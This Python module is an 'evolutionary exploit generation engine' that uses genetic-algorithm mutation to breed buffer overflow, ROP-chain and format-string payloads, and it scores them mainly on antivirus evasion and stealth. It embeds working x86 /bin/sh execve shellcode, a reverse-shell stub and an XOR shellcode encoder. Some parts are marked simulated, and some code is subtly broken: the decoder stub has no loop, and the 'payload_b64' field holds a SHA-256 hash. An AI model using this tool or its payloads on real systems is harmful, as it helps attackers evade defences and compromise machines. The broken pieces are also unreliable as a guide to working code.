"""
Evolutionary Exploit Generation Engine
Genetic algorithm-based exploit development with automatic mutation and fitness testing.
Self-evolving payloads that adapt to target environments.
"""

import asyncio
import hashlib
import random
import struct
import time
from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Dict, List, Optional, Set, Tuple, Any, Callable
from datetime import datetime
from collections import defaultdict
import copy
import math


class ExploitType(Enum):
    """Types of exploits"""
    BUFFER_OVERFLOW = auto()
    FORMAT_STRING = auto()
    USE_AFTER_FREE = auto()
    INTEGER_OVERFLOW = auto()
    HEAP_SPRAY = auto()
    ROP_CHAIN = auto()
    JIT_SPRAY = auto()
    TYPE_CONFUSION = auto()
    DESERIALIZATION = auto()
    COMMAND_INJECTION = auto()


class PayloadStage(Enum):
    """Exploit payload stages"""
    SHELLCODE = auto()
    STAGER = auto()
    LOADER = auto()
    DROPPER = auto()
    REFLECTIVE = auto()


class FitnessMetric(Enum):
    """Fitness evaluation metrics"""
    EVASION_SCORE = auto()
    RELIABILITY = auto()
    STEALTH = auto()
    PAYLOAD_SIZE = auto()
    EXECUTION_TIME = auto()
    TARGET_MATCH = auto()


class MutationType(Enum):
    """Mutation operations"""
    BIT_FLIP = auto()
    BYTE_SWAP = auto()
    BLOCK_SHUFFLE = auto()
    INSTRUCTION_SUBSTITUTE = auto()
    NOP_INSERT = auto()
    JUNK_INSERT = auto()
    REGISTER_SWAP = auto()
    OPCODE_EQUIVALENT = auto()
    ENCODING_CHANGE = auto()


@dataclass
class Gene:
    """Single gene in exploit chromosome"""
    id: str
    gene_type: str
    value: bytes
    position: int
    mutable: bool = True
    fitness_contribution: float = 0.0


@dataclass
class Chromosome:
    """Exploit chromosome containing genes"""
    id: str
    genes: List[Gene]
    exploit_type: ExploitType
    fitness: float = 0.0
    generation: int = 0
    parent_ids: List[str] = field(default_factory=list)
    mutations_applied: List[MutationType] = field(default_factory=list)
    created_at: datetime = field(default_factory=datetime.now)


@dataclass
class ExploitCandidate:
    """Candidate exploit for evaluation"""
    id: str
    chromosome: Chromosome
    payload: bytes
    target_info: Dict[str, Any]
    test_results: Dict[str, float] = field(default_factory=dict)
    viable: bool = False


@dataclass
class Population:
    """Population of exploit candidates"""
    generation: int
    chromosomes: List[Chromosome]
    best_fitness: float = 0.0
    avg_fitness: float = 0.0
    diversity_score: float = 0.0


class GeneticOperators:
    """Genetic algorithm operators"""
    
    def __init__(self, mutation_rate: float = 0.1, crossover_rate: float = 0.7):
        self.mutation_rate = mutation_rate
        self.crossover_rate = crossover_rate
    
    def crossover(self, parent1: Chromosome, parent2: Chromosome) -> Tuple[Chromosome, Chromosome]:
        """Single-point crossover"""
        if random.random() > self.crossover_rate:
            return copy.deepcopy(parent1), copy.deepcopy(parent2)
        
        # Find crossover point
        min_len = min(len(parent1.genes), len(parent2.genes))
        if min_len < 2:
            return copy.deepcopy(parent1), copy.deepcopy(parent2)
        
        crossover_point = random.randint(1, min_len - 1)
        
        # Create offspring
        child1_genes = parent1.genes[:crossover_point] + parent2.genes[crossover_point:]
        child2_genes = parent2.genes[:crossover_point] + parent1.genes[crossover_point:]
        
        child1 = Chromosome(
            id=hashlib.md5(f"{parent1.id}{parent2.id}{time.time()}".encode()).hexdigest()[:12],
            genes=copy.deepcopy(child1_genes),
            exploit_type=parent1.exploit_type,
            generation=max(parent1.generation, parent2.generation) + 1,
            parent_ids=[parent1.id, parent2.id]
        )
        
        child2 = Chromosome(
            id=hashlib.md5(f"{parent2.id}{parent1.id}{time.time()}".encode()).hexdigest()[:12],
            genes=copy.deepcopy(child2_genes),
            exploit_type=parent2.exploit_type,
            generation=max(parent1.generation, parent2.generation) + 1,
            parent_ids=[parent2.id, parent1.id]
        )
        
        return child1, child2
    
    def mutate(self, chromosome: Chromosome) -> Chromosome:
        """Apply mutations to chromosome"""
        mutated = copy.deepcopy(chromosome)
        
        for gene in mutated.genes:
            if gene.mutable and random.random() < self.mutation_rate:
                mutation_type = random.choice(list(MutationType))
                gene.value = self._apply_mutation(gene.value, mutation_type)
                mutated.mutations_applied.append(mutation_type)
        
        return mutated
    
    def _apply_mutation(self, value: bytes, mutation_type: MutationType) -> bytes:
        """Apply specific mutation to value"""
        if not value:
            return value
        
        value_list = list(value)
        
        if mutation_type == MutationType.BIT_FLIP:
            pos = random.randint(0, len(value_list) - 1)
            bit = random.randint(0, 7)
            value_list[pos] ^= (1 << bit)
        
        elif mutation_type == MutationType.BYTE_SWAP:
            if len(value_list) >= 2:
                pos1 = random.randint(0, len(value_list) - 1)
                pos2 = random.randint(0, len(value_list) - 1)
                value_list[pos1], value_list[pos2] = value_list[pos2], value_list[pos1]
        
        elif mutation_type == MutationType.NOP_INSERT:
            pos = random.randint(0, len(value_list))
            value_list.insert(pos, 0x90)  # NOP
        
        elif mutation_type == MutationType.JUNK_INSERT:
            pos = random.randint(0, len(value_list))
            junk = random.randint(0, 255)
            value_list.insert(pos, junk)
        
        elif mutation_type == MutationType.BLOCK_SHUFFLE:
            if len(value_list) >= 4:
                block_size = len(value_list) // 4
                blocks = [value_list[i:i+block_size] for i in range(0, len(value_list), block_size)]
                random.shuffle(blocks)
                value_list = [b for block in blocks for b in block]
        
        elif mutation_type == MutationType.ENCODING_CHANGE:
            # XOR with random key
            key = random.randint(1, 255)
            value_list = [b ^ key for b in value_list]
        
        return bytes(value_list)


class FitnessEvaluator:
    """Evaluate exploit fitness"""
    
    def __init__(self, weights: Dict[FitnessMetric, float] = None):
        self.weights = weights or {
            FitnessMetric.EVASION_SCORE: 0.3,
            FitnessMetric.RELIABILITY: 0.25,
            FitnessMetric.STEALTH: 0.2,
            FitnessMetric.PAYLOAD_SIZE: 0.1,
            FitnessMetric.EXECUTION_TIME: 0.05,
            FitnessMetric.TARGET_MATCH: 0.1
        }
        
        self.av_signatures = self._load_av_signatures()
    
    def _load_av_signatures(self) -> List[bytes]:
        """Load known AV signatures (simulated)"""
        return [
            b'\x31\xc0\x50\x68',  # Common shellcode pattern
            b'\x6a\x02\x58\xcd\x80',  # Linux syscall pattern
            b'\xeb\xfe',  # Infinite loop
            b'\xcc\xcc\xcc',  # INT3 breakpoints
        ]
    
    async def evaluate(self, candidate: ExploitCandidate) -> float:
        """Evaluate candidate fitness"""
        scores = {}
        
        # Evasion score
        scores[FitnessMetric.EVASION_SCORE] = await self._evaluate_evasion(candidate)
        
        # Reliability
        scores[FitnessMetric.RELIABILITY] = await self._evaluate_reliability(candidate)
        
        # Stealth
        scores[FitnessMetric.STEALTH] = await self._evaluate_stealth(candidate)
        
        # Payload size (smaller is better)
        scores[FitnessMetric.PAYLOAD_SIZE] = self._evaluate_size(candidate)
        
        # Execution time (faster is better)
        scores[FitnessMetric.EXECUTION_TIME] = await self._evaluate_execution_time(candidate)
        
        # Target match
        scores[FitnessMetric.TARGET_MATCH] = self._evaluate_target_match(candidate)
        
        candidate.test_results = {m.name: s for m, s in scores.items()}
        
        # Calculate weighted fitness
        total_fitness = sum(
            self.weights[metric] * score
            for metric, score in scores.items()
        )
        
        candidate.chromosome.fitness = total_fitness
        
        return total_fitness
    
    async def _evaluate_evasion(self, candidate: ExploitCandidate) -> float:
        """Evaluate AV evasion capability"""
        payload = candidate.payload
        
        # Check against known signatures
        matches = 0
        for sig in self.av_signatures:
            if sig in payload:
                matches += 1
        
        # More signatures matched = lower score
        if matches == 0:
            return 1.0
        return max(0.0, 1.0 - (matches * 0.25))
    
    async def _evaluate_reliability(self, candidate: ExploitCandidate) -> float:
        """Evaluate exploit reliability"""
        # Simulated reliability testing
        payload = candidate.payload
        
        # Check for null bytes (problematic in some contexts)
        null_count = payload.count(b'\x00')
        null_penalty = min(null_count * 0.02, 0.5)
        
        # Check for proper structure
        structure_score = 1.0
        if len(payload) < 10:
            structure_score = 0.5
        
        return max(0.0, structure_score - null_penalty)
    
    async def _evaluate_stealth(self, candidate: ExploitCandidate) -> float:
        """Evaluate stealth characteristics"""
        payload = candidate.payload
        
        # Entropy analysis (higher entropy = more random/encrypted)
        entropy = self._calculate_entropy(payload)
        
        # Very high or very low entropy is suspicious
        if entropy < 2.0 or entropy > 7.5:
            return 0.5
        
        return min(1.0, entropy / 7.0)
    
    def _evaluate_size(self, candidate: ExploitCandidate) -> float:
        """Evaluate payload size (smaller is better)"""
        size = len(candidate.payload)
        
        # Ideal size range: 50-500 bytes
        if size < 50:
            return 0.5  # Too small, might be incomplete
        elif size <= 500:
            return 1.0
        elif size <= 1000:
            return 0.8
        elif size <= 5000:
            return 0.5
        else:
            return 0.2
    
    async def _evaluate_execution_time(self, candidate: ExploitCandidate) -> float:
        """Evaluate expected execution time"""
        # Simulated - based on instruction count estimation
        size = len(candidate.payload)
        estimated_instructions = size / 3  # Rough average instruction size
        
        if estimated_instructions < 100:
            return 1.0
        elif estimated_instructions < 500:
            return 0.8
        else:
            return 0.5
    
    def _evaluate_target_match(self, candidate: ExploitCandidate) -> float:
        """Evaluate match with target characteristics"""
        target_info = candidate.target_info
        exploit_type = candidate.chromosome.exploit_type
        
        # Check architecture match
        arch = target_info.get("arch", "x86")
        os_type = target_info.get("os", "linux")
        
        base_score = 0.5
        
        # Adjust based on exploit type compatibility
        if exploit_type == ExploitType.BUFFER_OVERFLOW:
            if target_info.get("has_aslr", False):
                base_score -= 0.2
            if target_info.get("has_dep", False):
                base_score -= 0.1
        
        elif exploit_type == ExploitType.ROP_CHAIN:
            if target_info.get("has_gadgets", True):
                base_score += 0.3
        
        return max(0.0, min(1.0, base_score + 0.5))
    
    def _calculate_entropy(self, data: bytes) -> float:
        """Calculate Shannon entropy"""
        if not data:
            return 0.0
        
        frequency = defaultdict(int)
        for byte in data:
            frequency[byte] += 1
        
        entropy = 0.0
        length = len(data)
        
        for count in frequency.values():
            probability = count / length
            if probability > 0:
                entropy -= probability * math.log2(probability)
        
        return entropy


class ShellcodeGenerator:
    """Generate shellcode components"""
    
    def __init__(self, arch: str = "x86"):
        self.arch = arch
        self.gadgets = self._load_gadgets()
    
    def _load_gadgets(self) -> Dict[str, bytes]:
        """Load ROP gadgets and shellcode snippets"""
        return {
            "nop": b"\x90",
            "ret": b"\xc3",
            "syscall_x86": b"\xcd\x80",
            "syscall_x64": b"\x0f\x05",
            "push_eax": b"\x50",
            "pop_eax": b"\x58",
            "xor_eax": b"\x31\xc0",
            "inc_eax": b"\x40",
            "jmp_short": b"\xeb",
        }
    
    def generate_nop_sled(self, length: int) -> bytes:
        """Generate NOP sled"""
        return self.gadgets["nop"] * length
    
    def generate_shellcode(self, shellcode_type: str = "exec") -> bytes:
        """Generate basic shellcode"""
        if shellcode_type == "exec":
            # Minimal execve shellcode (x86)
            return bytes([
                0x31, 0xc0,        # xor eax, eax
                0x50,              # push eax
                0x68, 0x2f, 0x2f, 0x73, 0x68,  # push "//sh"
                0x68, 0x2f, 0x62, 0x69, 0x6e,  # push "/bin"
                0x89, 0xe3,        # mov ebx, esp
                0x50,              # push eax
                0x53,              # push ebx
                0x89, 0xe1,        # mov ecx, esp
                0xb0, 0x0b,        # mov al, 11
                0xcd, 0x80         # int 0x80
            ])
        
        elif shellcode_type == "reverse_shell":
            # Placeholder reverse shell
            return bytes([
                0x31, 0xc0, 0x31, 0xdb, 0x31, 0xc9, 0x31, 0xd2,
                0xb0, 0x66, 0xb3, 0x01, 0x51, 0x6a, 0x06, 0x6a,
                0x01, 0x6a, 0x02, 0x89, 0xe1, 0xcd, 0x80
            ])
        
        return b"\x90\x90\x90\x90"  # Default NOP sled
    
    def encode_shellcode(self, shellcode: bytes, encoder: str = "xor") -> bytes:
        """Encode shellcode"""
        if encoder == "xor":
            key = random.randint(1, 255)
            encoded = bytes([b ^ key for b in shellcode])
            
            # Prepend decoder stub
            decoder = bytes([
                0x31, 0xc9,        # xor ecx, ecx
                0x80, 0xc1, len(shellcode) & 0xFF,  # add cl, length
                0xeb, 0x05,        # jmp short to encoded
            ])
            
            return decoder + encoded
        
        return shellcode


class EvolutionaryExploitEngine:
    """Main evolutionary exploit generation engine"""
    
    def __init__(self, config, db):
        self.config = config
        self.db = db
        
        self.genetic_ops = GeneticOperators(mutation_rate=0.15, crossover_rate=0.7)
        self.fitness_eval = FitnessEvaluator()
        self.shellcode_gen = ShellcodeGenerator()
        
        self.populations: Dict[str, Population] = {}
        self.best_candidates: Dict[ExploitType, ExploitCandidate] = {}
        
        self.population_size = 50
        self.max_generations = 100
        self.elite_count = 5
    
    async def evolve_exploit(self, exploit_type: ExploitType,
                             target_info: Dict[str, Any],
                             generations: int = None) -> ExploitCandidate:
        """Evolve exploit for target"""
        generations = generations or self.max_generations
        
        # Initialize population
        population = await self._initialize_population(exploit_type, target_info)
        
        for gen in range(generations):
            # Evaluate fitness
            candidates = await self._evaluate_population(population, target_info)
            
            # Select parents
            parents = self._selection(population)
            
            # Create next generation
            offspring = []
            
            # Elite preservation
            elite = sorted(population.chromosomes, 
                          key=lambda c: c.fitness, 
                          reverse=True)[:self.elite_count]
            offspring.extend(elite)
            
            # Crossover and mutation
            while len(offspring) < self.population_size:
                parent1, parent2 = random.sample(parents, 2)
                child1, child2 = self.genetic_ops.crossover(parent1, parent2)
                
                child1 = self.genetic_ops.mutate(child1)
                child2 = self.genetic_ops.mutate(child2)
                
                offspring.extend([child1, child2])
            
            # Update population
            population = Population(
                generation=gen + 1,
                chromosomes=offspring[:self.population_size]
            )
            
            # Update statistics
            fitness_values = [c.fitness for c in population.chromosomes]
            population.best_fitness = max(fitness_values) if fitness_values else 0
            population.avg_fitness = sum(fitness_values) / len(fitness_values) if fitness_values else 0
            population.diversity_score = self._calculate_diversity(population)
            
            self.populations[f"{exploit_type.name}_{gen}"] = population
            
            # Early termination if excellent fitness
            if population.best_fitness > 0.95:
                break
        
        # Get best candidate
        best_chromosome = max(population.chromosomes, key=lambda c: c.fitness)
        best_candidate = await self._chromosome_to_candidate(best_chromosome, target_info)
        
        self.best_candidates[exploit_type] = best_candidate
        
        return best_candidate
    
    async def _initialize_population(self, exploit_type: ExploitType,
                                     target_info: Dict[str, Any]) -> Population:
        """Initialize population with random chromosomes"""
        chromosomes = []
        
        for i in range(self.population_size):
            chromosome = await self._generate_random_chromosome(exploit_type, target_info)
            chromosomes.append(chromosome)
        
        return Population(generation=0, chromosomes=chromosomes)
    
    async def _generate_random_chromosome(self, exploit_type: ExploitType,
                                          target_info: Dict[str, Any]) -> Chromosome:
        """Generate random chromosome for exploit type"""
        genes = []
        
        if exploit_type == ExploitType.BUFFER_OVERFLOW:
            # Buffer overflow genes
            genes.append(Gene(
                id="padding",
                gene_type="padding",
                value=b"A" * random.randint(50, 200),
                position=0
            ))
            genes.append(Gene(
                id="ret_addr",
                gene_type="return_address",
                value=struct.pack("<I", random.randint(0x08040000, 0x08050000)),
                position=1
            ))
            genes.append(Gene(
                id="nop_sled",
                gene_type="nop_sled",
                value=self.shellcode_gen.generate_nop_sled(random.randint(10, 50)),
                position=2
            ))
            genes.append(Gene(
                id="shellcode",
                gene_type="shellcode",
                value=self.shellcode_gen.generate_shellcode("exec"),
                position=3
            ))
        
        elif exploit_type == ExploitType.ROP_CHAIN:
            # ROP chain genes
            for j in range(random.randint(5, 15)):
                genes.append(Gene(
                    id=f"gadget_{j}",
                    gene_type="rop_gadget",
                    value=struct.pack("<I", random.randint(0x08040000, 0x08050000)),
                    position=j
                ))
        
        elif exploit_type == ExploitType.FORMAT_STRING:
            # Format string genes
            genes.append(Gene(
                id="format",
                gene_type="format_string",
                value=b"%x." * random.randint(5, 20),
                position=0
            ))
            genes.append(Gene(
                id="write",
                gene_type="write_primitive",
                value=b"%n%n%n%n",
                position=1
            ))
        
        else:
            # Generic exploit genes
            genes.append(Gene(
                id="payload",
                gene_type="generic",
                value=bytes([random.randint(0, 255) for _ in range(random.randint(50, 200))]),
                position=0
            ))
        
        return Chromosome(
            id=hashlib.md5(f"{exploit_type}{time.time()}{random.random()}".encode()).hexdigest()[:12],
            genes=genes,
            exploit_type=exploit_type,
            generation=0
        )
    
    async def _evaluate_population(self, population: Population,
                                   target_info: Dict[str, Any]) -> List[ExploitCandidate]:
        """Evaluate all chromosomes in population"""
        candidates = []
        
        for chromosome in population.chromosomes:
            candidate = await self._chromosome_to_candidate(chromosome, target_info)
            await self.fitness_eval.evaluate(candidate)
            candidates.append(candidate)
        
        return candidates
    
    async def _chromosome_to_candidate(self, chromosome: Chromosome,
                                       target_info: Dict[str, Any]) -> ExploitCandidate:
        """Convert chromosome to exploit candidate"""
        # Assemble payload from genes
        sorted_genes = sorted(chromosome.genes, key=lambda g: g.position)
        payload = b''.join(g.value for g in sorted_genes)
        
        return ExploitCandidate(
            id=chromosome.id,
            chromosome=chromosome,
            payload=payload,
            target_info=target_info
        )
    
    def _selection(self, population: Population) -> List[Chromosome]:
        """Tournament selection"""
        selected = []
        tournament_size = 3
        
        for _ in range(len(population.chromosomes)):
            tournament = random.sample(population.chromosomes, 
                                      min(tournament_size, len(population.chromosomes)))
            winner = max(tournament, key=lambda c: c.fitness)
            selected.append(winner)
        
        return selected
    
    def _calculate_diversity(self, population: Population) -> float:
        """Calculate population diversity"""
        if len(population.chromosomes) < 2:
            return 0.0
        
        payloads = []
        for chrom in population.chromosomes:
            payload = b''.join(g.value for g in chrom.genes)
            payloads.append(payload)
        
        # Calculate average hamming distance
        total_distance = 0
        comparisons = 0
        
        for i in range(len(payloads)):
            for j in range(i + 1, len(payloads)):
                distance = self._hamming_distance(payloads[i], payloads[j])
                total_distance += distance
                comparisons += 1
        
        if comparisons == 0:
            return 0.0
        
        avg_distance = total_distance / comparisons
        max_distance = max(len(p) for p in payloads) * 8
        
        return avg_distance / max_distance if max_distance > 0 else 0.0
    
    def _hamming_distance(self, a: bytes, b: bytes) -> int:
        """Calculate hamming distance between two byte sequences"""
        max_len = max(len(a), len(b))
        a = a.ljust(max_len, b'\x00')
        b = b.ljust(max_len, b'\x00')
        
        distance = 0
        for x, y in zip(a, b):
            xor = x ^ y
            distance += bin(xor).count('1')
        
        return distance
    
    def get_evolution_stats(self, exploit_type: ExploitType = None) -> Dict[str, Any]:
        """Get evolution statistics"""
        stats = {
            "total_populations": len(self.populations),
            "best_candidates": {
                et.name: {
                    "fitness": cand.chromosome.fitness,
                    "generation": cand.chromosome.generation,
                    "payload_size": len(cand.payload)
                }
                for et, cand in self.best_candidates.items()
            }
        }
        
        if exploit_type:
            type_populations = {
                k: v for k, v in self.populations.items()
                if k.startswith(exploit_type.name)
            }
            
            if type_populations:
                latest = max(type_populations.values(), key=lambda p: p.generation)
                stats["latest_generation"] = {
                    "generation": latest.generation,
                    "best_fitness": latest.best_fitness,
                    "avg_fitness": latest.avg_fitness,
                    "diversity": latest.diversity_score
                }
        
        return stats
    
    def export_best_exploit(self, exploit_type: ExploitType) -> Optional[Dict[str, Any]]:
        """Export best evolved exploit"""
        candidate = self.best_candidates.get(exploit_type)
        if not candidate:
            return None
        
        return {
            "type": exploit_type.name,
            "payload_hex": candidate.payload.hex(),
            "payload_b64": hashlib.sha256(candidate.payload).hexdigest(),
            "size": len(candidate.payload),
            "fitness": candidate.chromosome.fitness,
            "generation": candidate.chromosome.generation,
            "mutations": [m.name for m in candidate.chromosome.mutations_applied],
            "test_results": candidate.test_results
        }
